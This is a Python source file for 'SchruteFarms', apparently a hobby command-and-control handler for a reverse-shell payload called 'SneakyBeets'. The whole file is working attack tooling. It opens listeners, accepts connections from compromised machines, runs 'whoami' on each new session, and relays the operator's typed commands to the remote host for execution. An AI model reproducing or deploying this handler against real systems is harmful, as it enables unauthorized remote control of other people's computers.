#This is a python version of the handler

#!/usr/bin/env python3

import socket
import os
import threading
import readline
from time import sleep
from art import text2art

#cool intro stuff
awesome = text2art("SchruteFarms")

print(awesome)
print("This is a handler for the one and only SneakyBeets payload")
print("Written by Jarod Keene\n")


HOST = '127.0.0.1'	# Standard loopback interface address (localhost)
PORT = 1234			# Port to listen on (non-privileged ports are > 1023)

sessions = []
listeners = []

class listenerClass:
	listening_port = 1234
	listener_id = 0
	listenerIdCount = 0	#this will hold next available listenerID

class sessionClass:
	socket = 0
	session_id = 0
	local_port = 0
	remote_port = 0
	remote_ip = 0
	remote_user = "UNKNOWN"
	sessionIdCount = 0	#this will hold next available sessionID


def main():
	while 1:
		command = getCommand()

		#commands = command.trim()
		commands = command.split(" ")

		if commands[0] == "listener":
			if len(commands) > 1:
				try:
					lisPort = int(commands[1])
				except:
					print("Integer required")
					continue

				thread = threading.Thread(target=listener, args=(lisPort,))
				thread.daemon = True
				thread.start()

			else:
				print("Usage: listener <port>")
		
		elif commands[0] == "default":
			listener(PORT)

		elif commands[0] == "listeners":
			#this code will be implemented at a later time when listeners are multithreaded
			print("Listeners:\n")
			for lis in listeners:
				print("Listener ID: " + str(lis.listener_id) + "   Listening Port: " + str(lis.listening_port))
			print("")

		elif commands[0] == "sessions":
			#this code will be implemented at a later time when sessions are multithreaded
			print("Sessions:\n")
			for sesh in sessions:
				print("Session ID: " + str(sesh.session_id) + "  Remote IP: " + str(sesh.remote_ip) + "   Remote User: " + str(sesh.remote_user))
			print("")

		elif commands[0] == "session" or commands[0] == "interact":
			try:
				sid = int(commands[1])
			except:
				print("Usage: session <sid>")
				continue
			interact(sid)

		elif commands[0] == "kill":
			try:
				sid = int(commands[1])
			except:
				print("Usage: kill <sid>")
				continue
			sesh = getSession(sid)
			if sesh:
				kill(sesh)


		elif commands[0] == "help": #this will open the help menu txt file and print it out
			f = open("help.txt", 'r')
			menu = f.read()
			print('\n' + menu +'\n')
			f.close() #close the open file

		elif commands[0] == "clear":
			os.system('clear')

		
		elif commands[0] == "exit":
			for sesh in sessions:
				kill(sesh)
			print("Exiting...")
			return
		else:
			print("Bad Input.")




def getCommand():
	c = ""
	while not c:
	   c = input("SchruteFarms> ")

	return c



def interact(sid):
	#interact with a given session passing in a session id
	curr = getSession(sid)

	if not curr:
		#if no session with given session id
		print("Session ID not found.")
		return

	cont = 1
	while cont:
		#now we can pass commands to the payload for execution
		data = "filler"
		command = input("SneakyBeets " + str(curr.session_id) + "-> ")

		if command == "bg" or command == "background":
			return

		command += '\n'

		if command == '\n':
			continue

		curr.socket.sendall(command.encode())

		sleep(0.1) #stupid thing to make sure socket is ready to fully read

		data = curr.socket.recv(8192)
		print(data.decode())

		#leave conditions
		if command == "exit\n":
			cont = 0
			kill(curr)
		if not data: #if read nothing
			cont = 0

def kill(sesh):
	command = "exit\n"
	sesh.socket.sendall(command.encode())
	data = sesh.socket.recv(2048)

	print("Session: " + str(sesh.session_id) + " closed")
	sesh.socket.close()
	sessions.remove(sesh)


def getSession(sid):
	for sesh in sessions:
		if sesh.session_id == sid:
			return sesh

	return 0



def listener(port):
	if port < 1024 or port > 65535:
		print("INVALID PORT")
		return
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
		print("Starting listener....\n")
		try:
			s.bind((HOST, port))
		except:
			print("Port already in use")
			return
		#print("Socket bind complete") debugging purposes

		s.listen()
		print("Listening on port " + str(port))

		# add a new listener to the listener list
		newlist = listenerClass()
		newlist.listener_id = listenerClass.listenerIdCount
		listenerClass.listenerIdCount += 1
		newlist.listening_port = str(port)
		listeners.append(newlist)

		#now sit and wait for a connection to be made
		#on connection pop the listener and create a session
		conn, addr = s.accept()

		listeners.remove(newlist)
		print('New session opened:')
		print('Connected by ' + addr[0] + ':' + str(addr[1]))
		#initial connection stuff
		data = conn.recv(2048)
		print(data.decode())

		newsesh = sessionClass()
		newsesh.socket = conn

		#give the session the next availabl id
		newsesh.session_id = sessionClass.sessionIdCount
		sessionClass.sessionIdCount += 1

		newsesh.local_port = port
		newsesh.remote_port = str(addr[1])
		newsesh.remote_ip = addr[0]
		newsesh.continueSession = 1

		command = "whoami\n"
		newsesh.socket.sendall(command.encode())
		newsesh.remote_user = newsesh.socket.recv(2048).decode()

		sessions.append(newsesh)

		return			




if __name__ == '__main__':
	main()
